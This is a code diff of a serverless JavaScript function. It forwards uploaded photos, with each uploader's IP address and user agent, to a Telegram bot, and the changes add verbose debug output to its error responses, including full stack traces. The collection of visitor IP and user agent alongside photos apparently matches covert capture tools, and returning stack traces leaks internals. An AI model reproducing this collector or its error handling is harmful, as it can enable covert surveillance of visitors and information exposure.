@@ -3,16 +3,16 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 exports.handler = async (event) => {
   if (event.httpMethod !== 'POST') {
-    return { statusCode: 405, body: 'Method Not Allowed' };
+    return { statusCode: 405, body: JSON.stringify({ error: 'Method Not Allowed' }) };
   }
   if (!TOKEN || !CHAT_ID) {
-    return { statusCode: 500, body: JSON.stringify({ error: 'env not set' }) };
+    return { statusCode: 500, body: JSON.stringify({ error: 'env not set', has_token: !!TOKEN, has_chat: !!CHAT_ID }) };
   }
 
   try {
     const contentType = event.headers['content-type'] || event.headers['Content-Type'] || '';
     if (!contentType.includes('multipart/form-data')) {
-      return { statusCode: 400, body: JSON.stringify({ error: 'multipart required' }) };
+      return { statusCode: 400, body: JSON.stringify({ error: 'multipart required', got: contentType }) };
     }
 
     const bodyBuf = event.isBase64Encoded
@@ -24,50 +24,44 @@ exports.handler = async (event) => {
 
     const parsed = parseMultipart(bodyBuf, contentType);
     if (!parsed || !parsed.photo) {
-      return { statusCode: 400, body: JSON.stringify({ error: 'no photo field' }) };
+      return { statusCode: 400, body: JSON.stringify({ error: 'no photo field', keys: parsed ? Object.keys(parsed) : null }) };
     }
 
     const boundary2 = '----TgBoundary' + Date.now();
     const parts = [];
     const label = parsed.label || 'photo';
-    const caption = `📸 Foto baru\nLabel: ${label}\nIP: ${ip}\nUA: ${ua.slice(0,120)}`;
+    const caption = `📸 Foto baru\nLabel: ${label}\nSize: ${parsed.photo.length} bytes\nIP: ${ip}\nUA: ${ua.slice(0,120)}`;
 
     parts.push(Buffer.from(
-      `--${boundary2}\r\n` +
-      `Content-Disposition: form-data; name="chat_id"\r\n\r\n${CHAT_ID}\r\n`
+      `--${boundary2}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${CHAT_ID}\r\n`
     ));
     parts.push(Buffer.from(
-      `--${boundary2}\r\n` +
-      `Content-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`
+      `--${boundary2}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`
     ));
     parts.push(Buffer.from(
-      `--${boundary2}\r\n` +
-      `Content-Disposition: form-data; name="photo"; filename="photo.jpg"\r\n` +
-      `Content-Type: image/jpeg\r\n\r\n`
+      `--${boundary2}\r\nContent-Disposition: form-data; name="photo"; filename="photo.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`
     ));
     parts.push(parsed.photo);
     parts.push(Buffer.from(`\r\n--${boundary2}--\r\n`));
 
-    const tgBody = Buffer.concat(parts);
-
     const tgRes = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
       method: 'POST',
       headers: { 'Content-Type': `multipart/form-data; boundary=${boundary2}` },
-      body: tgBody
+      body: Buffer.concat(parts)
     });
 
     const tgJson = await tgRes.json();
     if (!tgJson.ok) {
-      return { statusCode: 502, body: JSON.stringify({ error: 'telegram failed', detail: tgJson }) };
+      return { statusCode: 502, body: JSON.stringify({ error: 'telegram failed', status: tgRes.status, response: tgJson }) };
     }
 
     return {
       statusCode: 200,
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ ok: true })
+      body: JSON.stringify({ ok: true, label, size: parsed.photo.length })
     };
   } catch (err) {
-    return { statusCode: 500, body: JSON.stringify({ error: err.message }) };
+    return { statusCode: 500, body: JSON.stringify({ error: err.message, stack: err.stack }) };
   }
 };
 
@@ -102,4 +96,4 @@ function parseMultipart(buf, contentType) {
     idx = nextBoundary;
   }
   return result;
-  }
+              }
